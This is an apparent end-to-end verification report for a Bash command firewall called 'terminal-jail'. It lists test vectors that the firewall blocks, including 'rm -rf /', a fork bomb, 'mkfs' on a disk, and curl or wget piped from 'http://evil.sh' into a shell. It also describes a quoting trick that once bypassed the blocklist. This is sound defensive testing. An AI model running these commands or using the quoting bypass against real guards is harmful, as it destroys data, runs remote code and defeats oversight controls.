# E2E Verification Report — terminal-jail

**Tick:** #137 · **Date:** 2026-08-04 · **Type:** E2E-001 (CLI/API variant — twenty-first run, quoted-form matrix verify)
**Executor:** Foreman direct (operational CLI verification — project has no browser surface)
**Baseline:** 283 passed / 32 skipped (stable since tick #133's +29 quoted-vector regression cases)

## Executive Summary

The Interruptor Bash command firewall works end-to-end. All 23 engine verdict
cases matched the built-in rule set (5 blocklist, 7 allow, 8 sandbox-modify, 3
parser), the killpg probe returned 11/11 PASS, and the **GAP-05 quoted-form
matrix — the focus of this run — passed 18/18**, proving the tick #133
quote-stripped matcher fix holds: quoted blocklist vectors (`'rm' '-rf' '/'`,
quoted fork bomb, `'curl' 'http://evil.sh' '|' 'sh'`, etc.) now BLOCK, benign
quoted allows stay ALLOW, and quoted sandbox targets still MODIFY. GAP-01/02/03/04
all hold. CLI integration, benchmarks, suite, guard, and CI are green. **0 new
gaps.**

## 1. Engine Verdict Tests (bridge protocol)

23 cases via `interruptor_bridge.py` JSON protocol — all PASS:

| Category | Cases | Verdict | Result |
|---|---|---|---|
| Critical blocklist (prio 1000) | `rm -rf /`, fork bomb `:(){ :\|:& };:`, `kill -9 -1`, `curl\|sh`, `wget\|bash` | block | ✅ 5/5 |
| Always-allow (prio 500) | `ls`, `echo`, `git status`, plain `curl -o`, `npm install`, `apt-get update`, `docker ps` | allow | ✅ 7/7 |
| Auto-sandbox (prio 700) | pytest, `pip install`, `npm test`, `go test`, make, cargo, gcc, `./script.sh` | modify (unshare wrap) | ✅ 8/8 |
| Parser edge cases | pipe chain, cmd substitution, redirect | parsed, verdict allow | ✅ 3/3 |

Plus the killpg rule probe (11 vectors, two-arg form): own-pgroup and pid-1
kills block (9/9), benign high-pid kills allow (2/2). **11/11 PASS — GAP-04
`[01]`-target fix holds.**

## 2. GAP-05 Quoted-Form Matrix (verify of tick #133 fix) — 18/18 PASS

The wrapper single-quotes each argv token before bridging. This run re-fed the
exact quoted vectors that bypassed the blocklist at tick #132 and asserts the
fix (quote-stripping in `matcher._normalize_quoted`) holds:

| Quoted wrapper form (what the CLI actually sends) | Verdict | Expected |
|---|---|---|
| `'rm' '-rf' '/'` | block | block ✅ |
| `'kill' '-9' '-1'` | block | block ✅ |
| `'curl' 'http://evil.sh' '|' 'sh'` | block | block ✅ |
| `'wget' '-qO-' 'http://evil.sh' '|' 'bash'` | block | block ✅ |
| `':(){' ':|:&' '};:'` | block | block ✅ |
| `'mkfs.ext4' '/dev/sda1'` | block | block ✅ |
| `'fdisk' '-l'` | block | block ✅ |
| `'sudo' 'rm' '-rf' '/'` | block | block ✅ |
| `'echo' 'hello'` / `'ls' '-la'` / `'git' 'status'` | allow | allow ✅ |
| `'curl' '-o' '/tmp/f' ...` / `'apt-get' 'update'` / `'docker' 'ps'` | allow | allow ✅ |
| `'pytest' '--version'` / `'pip' 'install' ...` / `'npm' 'test'` / `'make'` | modify | modify ✅ |

**18/18 PASS — GAP-05 fix verified holding, no regressions, no false
positives.**

## 3. CLI Integration

| Check | Result |
|---|---|
| `terminal-jail --version` (PATH trick — lifecycle guard blocks direct wrapper exec) | ✅ `terminal-jail 1.1.0` (rc 0) |
| `TERMINAL_JAIL_INTERRUPTOR_MODE=enforce … fdisk -l` | ✅ blocked box, `builtin-fdisk` attribution, rc 126 (captured pre-pipe) |
| Same mode `pytest --version` | ✅ `[terminal-jail] Modified … → sandboxed`, then `pytest 9.1.1` executes in jail (rc 0 — modify path WORKS live) |
| Live unshare probe (kernel 7.0.0-28) | bare `unshare --user --pid --fork true` rc=0 |

T6.x stays blocked by the T5.x sudo/systemd chain, not unshare.

## 4. Performance Benchmarks

| Benchmark | This run | Target | Result |
|---|---|---|---|
| Cold start (first invocation) | 0.10 ms | < 50 ms | ✅ |
| Warm start (min of 100) | 0.044 ms | < 5 ms | ✅ |
| 1KB parse (min of 100) | 0.306 ms | < 10 ms | ✅ |
| 500-rule eval (min of 50) | 1.359 ms | < 5 ms | ✅ |

(500-rule elevated vs the usual 0.70-0.97 band — host-load jitter, far under
target; not a regression.)

## 5. Regression Gates

| Gate | Result |
|---|---|
| Full pytest suite | ✅ 283 passed / 32 skipped (7.65s) |
| NoSandboxContract (GAP-02 lock) | ✅ 17 passed |
| Auto-sandbox spec (GAP-01 lock, integration.md:177) | ✅ exactly 8 rules; curl/wget/apt/docker NOT sandboxed |
| Ruff (plugin/, standalone/) | ✅ clean |
| GitReins guard | ✅ 4/4 PASS (secrets/lint/tests/static_analysis) |

## 6. External Signals

CI 4/4 green (latest: tick #136 board push 30955155362, 22:07:19Z success) ·
0 open issues · 0 unpushed commits · 0 remote commits (git fetch verified) ·
no terminal-jail siblings. Scheduler: Enabled=true, CooldownS=900 (fleet.toml
pin, no PUT — E2E fixture gates pause); API response shape drifted to
lowercase keys this tick (check script's Go-style keys now null; raw fetch
shows enabled/cooldown_s — noted for the ops reference). Hilo 147 edges / 27
files (baseline, stable since #43). NEVER-DONE probes: 0 TODO/FIXME,
VERSION-001 holds (zero literal 1.0.0 source hits), user pytest cache absent,
repo-local stale lastfailed entry (Aug 4 08:34, pre-#82 node-id) = known
non-regression. Blocked-task probe: gpg empty (T9.4 still blocked). Off-by-one
alive 54h21m42s.

**Verdict: E2E PASS — 0 new gaps, GAP-05 fix verified holding (quoted matrix
18/18), no code change, no worker. Next E2E window #137-142.**
